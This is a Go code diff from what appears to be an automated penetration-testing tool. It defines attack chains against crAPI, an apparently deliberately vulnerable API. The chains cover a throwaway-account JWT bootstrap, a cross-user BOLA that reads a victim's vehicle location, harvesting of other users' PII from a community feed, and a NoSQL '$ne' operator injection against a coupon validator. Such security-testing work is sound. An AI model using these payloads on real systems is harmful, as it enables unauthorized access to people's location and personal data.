@@ -97,7 +97,61 @@ var crapiProfile = apiProfile{
 // {{victim_vehicle}} is another user's vehicle id harvested from the data-
 // exposure endpoint — reading their location with it is the BOLA.
 func crapiChains(base string) []pipeline.AttackPath {
-	return []pipeline.AttackPath{{
+	return []pipeline.AttackPath{
+		crapiBOLAVehicleLocation(base),
+		crapiExcessiveDataExposure(base),
+		crapiNoSQLiCoupon(base),
+	}
+}
+
+// crapiAuthSteps returns the two steps every crAPI playbook opens with:
+// register a throwaway attacker account (unique email + phone via the seeded
+// {{nonce}}/{{nonce_num}}) and log in, capturing the JWT into {{jwt}} for the
+// authenticated steps that follow. Factored out so each playbook composes the
+// same verified auth bootstrap instead of repeating it.
+func crapiAuthSteps(base string) []pipeline.AttackStep {
+	return []pipeline.AttackStep{
+		{
+			ID:          uuid.New(),
+			Name:        "register throwaway attacker account",
+			TechniqueID: "T1136",
+			Command: "httpreq --method POST --url " + base + "/identity/api/auth/signup " +
+				`--body '{"name":"atk","email":"atk_{{nonce}}@example.com","number":"{{nonce_num}}","password":"Attacker@123"}'`,
+		},
+		{
+			ID:          uuid.New(),
+			Name:        "log in and capture JWT",
+			TechniqueID: "T1078",
+			Command: "httpreq --method POST --url " + base + "/identity/api/auth/login " +
+				`--body '{"email":"atk_{{nonce}}@example.com","password":"Attacker@123"}' --capture jwt=$.token`,
+			ExpectedOutputPattern: "HTTP 200",
+		},
+	}
+}
+
+// crapiBOLAVehicleLocation — the flagship chain: read another user's live GPS
+// location using a vehicle id harvested from the community feed.
+func crapiBOLAVehicleLocation(base string) pipeline.AttackPath {
+	steps := crapiAuthSteps(base)
+	steps = append(steps,
+		pipeline.AttackStep{
+			ID:          uuid.New(),
+			Name:        "harvest a victim vehicle id from the community feed (excessive data exposure)",
+			TechniqueID: "T1213",
+			Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
+				"--header 'Authorization: Bearer {{jwt}}' --capture victim_vehicle=$.posts.0.author.vehicleid",
+			ExpectedOutputPattern: "vehicleid",
+		},
+		pipeline.AttackStep{
+			ID:          uuid.New(),
+			Name:        "BOLA: read the victim's vehicle location with the attacker's token",
+			TechniqueID: "T1530",
+			Command: "httpreq --url " + base + "/identity/api/v2/vehicle/{{victim_vehicle}}/location " +
+				"--header 'Authorization: Bearer {{jwt}}'",
+			ExpectedOutputPattern: "HTTP 200",
+		},
+	)
+	return pipeline.AttackPath{
 		ID:   uuid.New(),
 		Name: "crAPI BOLA: cross-user vehicle-location disclosure",
 		Description: "Broken Object Level Authorization on the vehicle-location API. A freshly " +
@@ -108,38 +162,64 @@ func crapiChains(base string) []pipeline.AttackPath {
 		ExpectedImpact:              "high",
 		EstimatedSuccessProbability: 0.9,
 		RequiredPrivileges:          "authenticated (self-registered) user",
-		Steps: []pipeline.AttackStep{
-			{
-				ID:          uuid.New(),
-				Name:        "register throwaway attacker account",
-				TechniqueID: "T1136",
-				Command: "httpreq --method POST --url " + base + "/identity/api/auth/signup " +
-					`--body '{"name":"atk","email":"atk_{{nonce}}@example.com","number":"{{nonce_num}}","password":"Attacker@123"}'`,
-			},
-			{
-				ID:          uuid.New(),
-				Name:        "log in and capture JWT",
-				TechniqueID: "T1078",
-				Command: "httpreq --method POST --url " + base + "/identity/api/auth/login " +
-					`--body '{"email":"atk_{{nonce}}@example.com","password":"Attacker@123"}' --capture jwt=$.token`,
-				ExpectedOutputPattern: "HTTP 200",
-			},
-			{
-				ID:          uuid.New(),
-				Name:        "harvest a victim vehicle id from the community feed (excessive data exposure)",
-				TechniqueID: "T1213",
-				Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
-					"--header 'Authorization: Bearer {{jwt}}' --capture victim_vehicle=$.posts.0.author.vehicleid",
-				ExpectedOutputPattern: "vehicleid",
-			},
-			{
-				ID:          uuid.New(),
-				Name:        "BOLA: read the victim's vehicle location with the attacker's token",
-				TechniqueID: "T1530",
-				Command: "httpreq --url " + base + "/identity/api/v2/vehicle/{{victim_vehicle}}/location " +
-					"--header 'Authorization: Bearer {{jwt}}'",
-				ExpectedOutputPattern: "HTTP 200",
-			},
-		},
-	}}
+		Steps:                       steps,
+	}
+}
+
+// crapiExcessiveDataExposure — the community feed returns other users' PII
+// (email + vehicle id) to any authenticated caller. This is a finding in its
+// own right (not just the BOLA harvest source).
+func crapiExcessiveDataExposure(base string) pipeline.AttackPath {
+	steps := crapiAuthSteps(base)
+	steps = append(steps, pipeline.AttackStep{
+		ID:          uuid.New(),
+		Name:        "read the community feed and observe other users' PII",
+		TechniqueID: "T1213",
+		Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
+			"--header 'Authorization: Bearer {{jwt}}'",
+		// A leaked vehicleid in the feed proves other users' PII is exposed.
+		ExpectedOutputPattern: "vehicleid",
+	})
+	return pipeline.AttackPath{
+		ID:   uuid.New(),
+		Name: "crAPI excessive data exposure: community feed leaks user PII",
+		Description: "The community feed (/community/api/v2/community/posts/recent) returns every " +
+			"post author's email address and internal vehicle id to any authenticated user. A normal " +
+			"account can harvest other users' personal data wholesale — and the vehicle ids feed the " +
+			"cross-user BOLA on the vehicle-location API.",
+		ExpectedImpact:              "high",
+		EstimatedSuccessProbability: 0.95,
+		RequiredPrivileges:          "authenticated (self-registered) user",
+		Steps:                       steps,
+	}
+}
+
+// crapiNoSQLiCoupon — the coupon validator passes the coupon_code straight into
+// a Mongo query, so a query operator ({"$ne":1}) matches an arbitrary coupon
+// where a bogus string does not. Returning a real coupon proves the injection.
+func crapiNoSQLiCoupon(base string) pipeline.AttackPath {
+	steps := crapiAuthSteps(base)
+	steps = append(steps, pipeline.AttackStep{
+		ID:          uuid.New(),
+		Name:        "inject a Mongo operator into the coupon validator (NoSQLi)",
+		TechniqueID: "T1190",
+		Command: "httpreq --method POST --url " + base + "/community/api/v2/coupon/validate-coupon " +
+			`--header 'Authorization: Bearer {{jwt}}' --body '{"coupon_code":{"$ne":1}}'`,
+		// A bogus string returns no coupon (500/{}); the operator returns a real
+		// coupon_code, so its presence in the body proves the injection.
+		ExpectedOutputPattern: "coupon_code",
+	})
+	return pipeline.AttackPath{
+		ID:   uuid.New(),
+		Name: "crAPI NoSQL injection: coupon validation operator injection",
+		Description: "The coupon-validation endpoint (/community/api/v2/coupon/validate-coupon) " +
+			"interpolates the coupon_code into a MongoDB query without sanitisation. Submitting a " +
+			"query operator object ({\"coupon_code\":{\"$ne\":1}}) instead of a string matches an " +
+			"arbitrary stored coupon and returns it, where a non-existent string returns nothing — " +
+			"proving NoSQL operator injection.",
+		ExpectedImpact:              "high",
+		EstimatedSuccessProbability: 0.85,
+		RequiredPrivileges:          "authenticated (self-registered) user",
+		Steps:                       steps,
+	}
 }
